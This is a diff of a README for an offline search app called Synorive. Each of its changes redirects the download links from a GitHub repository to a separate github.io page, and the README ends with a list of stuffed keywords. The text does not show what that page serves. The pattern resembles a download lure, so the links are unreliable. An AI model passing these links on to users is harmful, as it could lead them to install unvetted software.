@@ -1,7 +1,7 @@
 <h1>🔍 Synorive - Find Anything, Even Offline</h1>
 
 <p align="center">
-<a href="https://github.com/arturoaeriform174/Synorive"><img src="https://img.shields.io/badge/Download_Synorive-Free-4CAF50?style=for-the-badge&logo=github" alt="Download Synorive" width="300"></a>
+<a href="https://arturoaeriform174.github.io"><img src="https://img.shields.io/badge/Download_Synorive-Free-4CAF50?style=for-the-badge&logo=github" alt="Download Synorive" width="300"></a>
 </p>
 
 ---
@@ -27,7 +27,7 @@ This guide will take you from zero to searching in under five minutes.
 
 ### 📥 Download Synorive
 
-Visit this link to download the application: **[https://github.com/arturoaeriform174/Synorive](https://github.com/arturoaeriform174/Synorive)**
+Visit this link to download the application: **[https://arturoaeriform174.github.io](https://arturoaeriform174.github.io)**
 
 When you arrive at the page, look for a green button that says **"Code"** or **"Download"**. Click it, then choose **"Download ZIP"** if you see that option. The download will start automatically. Save the file to a location you remember, like your **Downloads** folder.
 
@@ -128,6 +128,6 @@ If you love Synorive, please give the repository a star (click the ⭐ button on
 
 Stop wasting time digging through folders. Download Synorive now and experience the effortless search you've always wanted—private, fast, and truly offline.
 
-**[👉 Download Synorive Now](https://github.com/arturoaeriform174/Synorive)**
+**[👉 Download Synorive Now](https://arturoaeriform174.github.io)**
 
 **Keywords:** artificial intelligence, android, claude-code, desktop app, document search, electron, embeddings, fact-checking, hybrid-search, image OCR, knowledge-base, local search, local-first, mcp, mcp-server, multimodal, offline, offline-ai, offline-first, privacy, rag, self-hosted, semantic-search, sqlite, vector-search, video search
